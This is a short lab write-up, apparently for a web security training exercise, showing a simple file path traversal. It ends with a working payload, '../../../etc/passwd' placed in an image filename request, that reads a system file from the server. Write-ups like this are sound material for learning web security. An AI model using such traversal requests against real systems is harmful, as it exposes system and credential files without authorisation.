# Lab: File path traversal, simple case

Choose any product.

<img width="333" height="396" alt="image" src="https://github.com/user-attachments/assets/6f23e21c-0bc0-43ef-8b5a-d095842226de" />

Firstly, try modifying the `productId` parameter in the URL.

<img width="799" height="48" alt="image" src="https://github.com/user-attachments/assets/d4e6029e-51b4-4397-a300-6e5c351e43b6" />

The product is accessed using the following request:

```http
GET /product?productId=1
```

Modify the `productId` parameter:

```text
/product?productId=1
→
/product?productId=../../../etc/passwd
```

The server responds with:

```text
Invalid product ID
```

This suggests that the `productId` parameter is being treated as a product identifier rather than being directly used as a filesystem path.

Therefore, another user-controlled input that interacts with the filesystem needs to be identified.

## Image Request

The product page contains an image.

<img width="403" height="363" alt="image" src="https://github.com/user-attachments/assets/be9fa00f-d57b-48de-ae0f-3448977f3c27" />

Use Burp Suite to intercept the request used to load the image.

The image is requested using:

```http
GET /image?filename=53.jpg HTTP/2
```

Modify the `filename` parameter:

```http
GET /image?filename=53.jpg HTTP/2
→
GET /image?filename=../../../etc/passwd HTTP/2
```

<img width="405" height="460" alt="image" src="https://github.com/user-attachments/assets/ad51a979-e8fc-4767-b2aa-23d29f07e440" />

The contents of `/etc/passwd` are successfully returned.

This confirms that the `filename` parameter is used to construct a filesystem path without properly validating or sanitising directory traversal sequences such as `../`.
